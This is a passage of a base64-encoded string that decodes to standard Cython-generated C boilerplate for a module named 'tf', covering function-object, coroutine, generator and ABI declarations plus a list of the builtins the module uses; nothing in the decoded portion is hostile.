Z1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqbSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGljdCk7CnN0YXRpYyBpbnQgX19weXhfQ3lGdW5jdGlvbl9pbml0KFB5T2JqZWN0ICptb2R1bGUpOwojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX05PQVJHUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7CnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9PKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKTsKc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcyk7CiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZikgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZiktPmZ1bmNfdmVjdG9yY2FsbCkKI2Vsc2UKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmKSAoKChQeUNGdW5jdGlvbk9iamVjdCopZiktPnZlY3RvcmNhbGwpCiNlbmRpZgojZW5kaWYKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fTmV3KFB5TWV0aG9kRGVmICptbCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqZ2xvYmFscywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCogY29kZSk7CgoKI2lmIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sgJiYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FCnN0YXRpYyBpbnQgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBpbnQgY19saW5lKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9DTGluZUZvclRyYWNlYmFjayh0c3RhdGUsIGNfbGluZSkgICgoKENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0spKSA/IGNfbGluZSA6IDApCiNlbmRpZgoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnR5cGVkZWYgUHlPYmplY3QgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGU7CiNlbHNlCnR5cGVkZWYgUHlDb2RlT2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlOwojZW5kaWYKdHlwZWRlZiBzdHJ1Y3QgewogICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0OwogICAgaW50IGNvZGVfbGluZTsKfSBfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeTsKc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSB7CiAgICBpbnQgY291bnQ7CiAgICBpbnQgbWF4X2NvdW50OwogICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXM7CiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICBfX3B5eF9hdG9taWNfaW50X3R5cGUgYWNjZXNzb3JfY291bnQ7CiAgI2VuZGlmCn07CnN0YXRpYyBpbnQgX19weXhfYmlzZWN0X2NvZGVfb2JqZWN0cyhfX1B5eF9Db2RlT2JqZWN0Q2FjaGVFbnRyeSogZW50cmllcywgaW50IGNvdW50LCBpbnQgY29kZV9saW5lKTsKc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpOwpzdGF0aWMgdm9pZCBfX3B5eF9pbnNlcnRfY29kZV9vYmplY3QoaW50IGNvZGVfbGluZSwgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0KTsKCgpzdGF0aWMgdm9pZCBfX1B5eF9BZGRUcmFjZWJhY2soY29uc3QgY2hhciAqZnVuY25hbWUsIGludCBjX2xpbmUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgcHlfbGluZSwgY29uc3QgY2hhciAqZmlsZW5hbWUpOwoKCiNpZiAhZGVmaW5lZChfX0lOVEVMX0NPTVBJTEVSKSAmJiBkZWZpbmVkKF9fR05VQ19fKSAmJiAoX19HTlVDX18gPiA0IHx8IChfX0dOVUNfXyA9PSA0ICYmIF9fR05VQ19NSU5PUl9fID49IDYpKQojZGVmaW5lIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQwojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0Zyb21fbG9uZyhsb25nIHZhbHVlKTsKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQp0eXBlZGVmIFB5T2JqZWN0ICpfX1B5eF9UeXBlTmFtZTsKI2RlZmluZSBfX1B5eF9GTVRfVFlQRU5BTUUgIiVVIgojZGVmaW5lIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmopIFB5X1hERUNSRUYob2JqKQojaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZSBQeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lCiNlbHNlCnN0YXRpYyBfX1B5eF9UeXBlTmFtZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5VHlwZU9iamVjdCogdHApOwojZW5kaWYKI2Vsc2UgIC8vICFMSU1JVEVEX0FQSQp0eXBlZGVmIGNvbnN0IGNoYXIgKl9fUHl4X1R5cGVOYW1lOwojZGVmaW5lIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJS4yMDBzIgojZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUodHApICgodHApLT50cF9uYW1lKQojZGVmaW5lIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmopCiNlbmRpZgoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGxvbmcgX19QeXhfUHlMb25nX0FzX2xvbmcoUHlPYmplY3QgKik7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKik7CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgojZGVmaW5lIF9fUHl4X1R5cGVDaGVjayhvYmosIHR5cGUpIF9fUHl4X0lzU3VidHlwZShQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlKQojZGVmaW5lIF9fUHl4X1R5cGVDaGVjazIob2JqLCB0eXBlMSwgdHlwZTIpIF9fUHl4X0lzQW55U3VidHlwZTIoUHlfVFlQRShvYmopLCAoUHlUeXBlT2JqZWN0ICopdHlwZTEsIChQeVR5cGVPYmplY3QgKil0eXBlMikKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc0FueVN1YnR5cGUyKFB5VHlwZU9iamVjdCAqY2xzLCBQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKnR5cGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZTEsIFB5T2JqZWN0ICp0eXBlMik7CiNlbHNlCiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrKG9iaiwgdHlwZSkgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUpCiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgKFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlMSkgfHwgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKSkKI2RlZmluZSBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlKSBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZTEsIFB5T2JqZWN0ICp0eXBlMikgewogICAgcmV0dXJuIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUxKSB8fCBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlMik7Cn0KI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlczIoZXJyMSwgZXJyMikgIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSwgZXJyMSwgZXJyMikKI2RlZmluZSBfX1B5eF9QeUV4Y2VwdGlvbl9DaGVjayhvYmopIF9fUHl4X1R5cGVDaGVjayhvYmosIFB5RXhjX0V4Y2VwdGlvbikKI2lmZGVmIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sKICAjZGVmaW5lIF9fUHl4X1B5QmFzZUV4Y2VwdGlvbl9DaGVjayhvYmopIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sob2JqKQojZWxzZQogICNkZWZpbmUgX19QeXhfUHlCYXNlRXhjZXB0aW9uX0NoZWNrKG9iaikgX19QeXhfVHlwZUNoZWNrKG9iaiwgUHlFeGNfQmFzZUV4Y2VwdGlvbikKI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5SXRlcl9OZXh0X1BsYWluKFB5T2JqZWN0ICppdGVyYXRvcik7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSSh2b2lkKTsKI2VuZGlmCgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMsIGludCBpdGVybmV4dCk7CgoKc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdDsKdHlwZWRlZiBQeU9iamVjdCAqKCpfX3B5eF9jb3JvdXRpbmVfYm9keV90KShzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0ICosIFB5VGhyZWFkU3RhdGUgKiwgUHlPYmplY3QgKik7CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiNkZWZpbmUgX19QeXhfRXhjSW5mb1N0cnVjdCAgX1B5RXJyX1N0YWNrSXRlbQojZWxzZQp0eXBlZGVmIHN0cnVjdCB7CiAgICBQeU9iamVjdCAqZXhjX3R5cGU7CiAgICBQeU9iamVjdCAqZXhjX3ZhbHVlOwogICAgUHlPYmplY3QgKmV4Y190cmFjZWJhY2s7Cn0gX19QeXhfRXhjSW5mb1N0cnVjdDsKI2VuZGlmCnR5cGVkZWYgc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdCB7CiAgICBQeU9iamVjdF9IRUFECiAgICBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHk7CiAgICBQeU9iamVjdCAqY2xvc3VyZTsKICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgZ2lfZXhjX3N0YXRlOwogICAgUHlPYmplY3QgKmdpX3dlYWtyZWZsaXN0OwogICAgUHlPYmplY3QgKmNsYXNzb2JqOwogICAgUHlPYmplY3QgKnlpZWxkZnJvbTsKICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyB5aWVsZGZyb21fYW1fc2VuZDsKICAgIFB5T2JqZWN0ICpnaV9uYW1lOwogICAgUHlPYmplY3QgKmdpX3F1YWxuYW1lOwogICAgUHlPYmplY3QgKmdpX21vZHVsZW5hbWU7CiAgICBQeU9iamVjdCAqZ2lfY29kZTsKICAgIFB5T2JqZWN0ICpnaV9mcmFtZTsKI2lmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgJiYgKENZVEhPTl9QUk9GSUxFIHx8IENZVEhPTl9UUkFDRSkKICAgIFB5TW9uaXRvcmluZ1N0YXRlIF9fcHl4X3B5bW9uaXRvcmluZ19zdGF0ZVtfX1B5eF9Nb25pdG9yaW5nRXZlbnRUeXBlc19DeUdlbl9jb3VudF07CiAgICB1aW50NjRfdCBfX3B5eF9weW1vbml0b3JpbmdfdmVyc2lvbjsKI2VuZGlmCiAgICBpbnQgcmVzdW1lX2xhYmVsOwogICAgY2hhciBpc19ydW5uaW5nOwp9IF9fcHl4X0Nvcm91dGluZU9iamVjdDsKc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoCiAgICBQeVR5cGVPYmplY3QgKnR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLAogICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKTsKc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KAogICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKnNlbGYpOwpzdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZik7CnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0FtU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCk7CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1NlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSk7CnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqKnJldHZhbCk7CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmdzKTsKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfU3dhcEV4Y2VwdGlvbihzZWxmKQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpICBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKQojZWxzZQojZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpIHtcCiAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCYoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSwgJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y192YWx1ZSwgJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2spO1wKICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoJihzZWxmKS0+Z2lfZXhjX3N0YXRlKTtcCiAgICB9CiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oc2VsZikge1wKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2spO1wKICAgIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlID0gKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayA9IE5VTEw7XAogICAgfQojZW5kaWYKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X1B5R2VuX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKHB2YWx1ZSlcCiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19weXhfdHN0YXRlLCBwdmFsdWUpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlHZW5fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUocHZhbHVlKVwKICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsIHB2YWx1ZSkKI2VuZGlmCnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKTsKc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKTsKc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pOwpzdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZ19nZXR0ZXIoUHlPYmplY3QgKmdlbiwgdm9pZCAqY2xvc3VyZSk7CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCnN0YXRpYyB2b2lkIF9fUHl4X1NldEJhY2twb3J0VHlwZUFtU2VuZChQeVR5cGVPYmplY3QgKnR5cGUsIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0ICpzdGF0aWNfYW1zZW5kX21ldGhvZHMsIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kKTsKI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKTsKCgojZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9VU0VECiNkZWZpbmUgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3Qob2JqKSBfX1B5eF9JU19UWVBFKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSkKI2RlZmluZSBfX1B5eF9HZW5lcmF0b3JfTmV3KGJvZHksIGNvZGUsIGNsb3N1cmUsIG5hbWUsIHF1YWxuYW1lLCBtb2R1bGVfbmFtZSlcCiAgICBfX1B5eF9fQ29yb3V0aW5lX05ldyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX05leHQoUHlPYmplY3QgKnNlbGYpOwpzdGF0aWMgaW50IF9fcHl4X0dlbmVyYXRvcl9pbml0KFB5T2JqZWN0ICptb2R1bGUpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpOwoKCnN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24odm9pZCk7CgoKc3RhdGljIGludCBfX1B5eF9jaGVja19iaW5hcnlfdmVyc2lvbih1bnNpZ25lZCBsb25nIGN0X3ZlcnNpb24sIHVuc2lnbmVkIGxvbmcgcnRfdmVyc2lvbiwgaW50IGFsbG93X25ld2VyKTsKCgojaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUICYmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfU3RhdGVfRmluZE1vZHVsZSh2b2lkKik7CnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlKFB5T2JqZWN0KiBtb2R1bGUsIHZvaWQqKTsKc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUodm9pZCopOwojZWxpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQojZGVmaW5lIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUgUHlTdGF0ZV9GaW5kTW9kdWxlCiNkZWZpbmUgX19QeXhfU3RhdGVfQWRkTW9kdWxlIFB5U3RhdGVfQWRkTW9kdWxlCiNkZWZpbmUgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlIFB5U3RhdGVfUmVtb3ZlTW9kdWxlCiNlbmRpZgoKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYICAiX2Zhc3RjYWxsIgogICAgI2Vsc2UKICAgICAgICAjZGVmaW5lIF9fUFlYX0ZBU1RDQUxMX0FCSV9TVUZGSVgKICAgICNlbmRpZgogICAgI2RlZmluZSBfX1BZWF9MSU1JVEVEX0FCSV9TVUZGSVggImxpbWl0ZWQiIF9fUFlYX0ZBU1RDQUxMX0FCSV9TVUZGSVggX19QWVhfQU1fU0VORF9BQklfU1VGRklYCiNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWAojZW5kaWYKI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDEKICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYCiNlbGlmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDIKICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYICJhbXNlbmRiYWNrcG9ydCIKI2Vsc2UKICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYICJub2Ftc2VuZCIKI2VuZGlmCiNpZm5kZWYgX19QWVhfTU9OSVRPUklOR19BQklfU1VGRklYCiAgICAjZGVmaW5lIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWAojZW5kaWYKI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgICNkZWZpbmUgX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWAojZWxzZQogICAgI2RlZmluZSBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYICJub2ZpbmFsaXplIgojZW5kaWYKI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTIHx8ICFkZWZpbmVkKF9fUHl4X0FzeW5jR2VuX1VTRUQpCiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYCiNlbHNlCiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYICJub2ZyZWVsaXN0cyIKI2VuZGlmCiNkZWZpbmUgQ1lUSE9OX0FCSSAgX19QWVhfQUJJX1ZFUlNJT04gX19QWVhfTElNSVRFRF9BQklfU1VGRklYIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWCBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWAojZGVmaW5lIF9fUFlYX0FCSV9NT0RVTEVfTkFNRSAiX2N5dGhvbl8iIENZVEhPTl9BQkkKI2RlZmluZSBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggX19QWVhfQUJJX01PRFVMRV9OQU1FICIuIgoKCgoKCiNkZWZpbmUgX19QeXhfTU9EVUxFX05BTUUgInRmIgpleHRlcm4gaW50IF9fcHl4X21vZHVsZV9pc19tYWluX3RmOwppbnQgX19weXhfbW9kdWxlX2lzX21haW5fdGYgPSAwOwoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fcHJpbnQ7CnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9LZXlib2FyZEludGVycnVwdDsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX29wZW47CnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9yYW5nZTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX3N1bTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX2lucHV0OwoKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19bXSA9ICIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzBbXSA9ICIwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xW10gPSAiMSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfNFtdID0gIjQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0FbXSA9ICJcMjAwQVwzMzBcclwwMjFc